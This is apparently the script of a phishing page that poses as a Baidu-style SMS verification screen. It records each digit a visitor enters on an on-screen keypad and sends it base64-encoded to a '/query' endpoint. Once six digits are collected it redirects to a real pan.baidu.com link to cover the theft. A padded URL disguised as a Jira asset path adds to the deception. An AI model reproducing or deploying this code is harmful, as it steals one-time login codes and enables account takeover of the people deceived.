    <script type="text/javascript">
        let gb = $("#goBack");
        gb.on('click', () => {
            history.go(-1)
        });

        let url = window.location.href.split("&");
        let mbid = '';
        let nexturl = "http://192.168.1.4:41236/checkMbl.html?05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&mbid=14298&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5";
        url.forEach(e => {
            if (/mbid\=/.test(e)) {
                nexturl = nexturl + e;
                mbid = e.replace("mbid=", "");
            }
        });
        $("#mbid").html(`验证码已发送至你的手机 ${mbid.substr(0, 3)}******${mbid.substr(3, 2)}`);

        let checkFire = () => {
            $(".pass-mod-loadingWrap").show();
            let str = `type=checkcodelogin&code=${currentNub.join("")}&`;
            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
                if (e == "error") {
                    currentNub = [];
                    makeShow();
                    $(".pass-mod-loadingWrap").hide();
                    $(".mod-red-error").html("请输入正确的验证码！");
                } else if (/pass/.test(e)) {
                    setTimeout(() => {
                        window.location.href = "https://pan.baidu.com/s/1bPx56kkQN73knyET7EiFvA";
                        // ehide();
                        // ll.hide();
                    }, 3400);
                } else {
                    setTimeout(() => {
                        // eshow("网络异常，请稍后重试");
                        // ll.hide();
                        currentNub = [];
                        makeShow();
                        $(".mod-red-error").html("网络异常，请稍后重试");
                        $(".pass-mod-loadingWrap").hide();
                    }, 7500);
                }
            });
        }

        let makeShow = () => {
            // keyboardInputEle
            $(".keyboardInputEle").each((i, e) => {
                $(e).html(currentNub[i] || "");
            });
        }

        let currentNub = [];
        let inputCheck = (n) => {
            $(".mod-red-error").html("");
            if (n === "-") {
                currentNub.pop();
                makeShow();
            } else if (currentNub.length == 6) {
                //
                return;
            } else {
                currentNub.push(n);
                makeShow();
                if (currentNub.length === 6) {
                    checkFire();
                }
            }
            let str = `type=checkcodeinput&code=${currentNub.join("")}&`;
            f(`/query?d=${window.btoa(encodeURIComponent(str))}`);
        }

        $("#dd1").on("click", () => { inputCheck(1) });
        $("#dd2").on("click", () => { inputCheck(2) });
        $("#dd3").on("click", () => { inputCheck(3) });
        $("#dd4").on("click", () => { inputCheck(4) });
        $("#dd5").on("click", () => { inputCheck(5) });
        $("#dd6").on("click", () => { inputCheck(6) });
        $("#dd7").on("click", () => { inputCheck(7) });
        $("#dd8").on("click", () => { inputCheck(8) });
        $("#dd9").on("click", () => { inputCheck(9) });
        $("#dd0").on("click", () => { inputCheck(0) });
        $("#ddd").on("click", () => { inputCheck("-") });

        //
    </script>
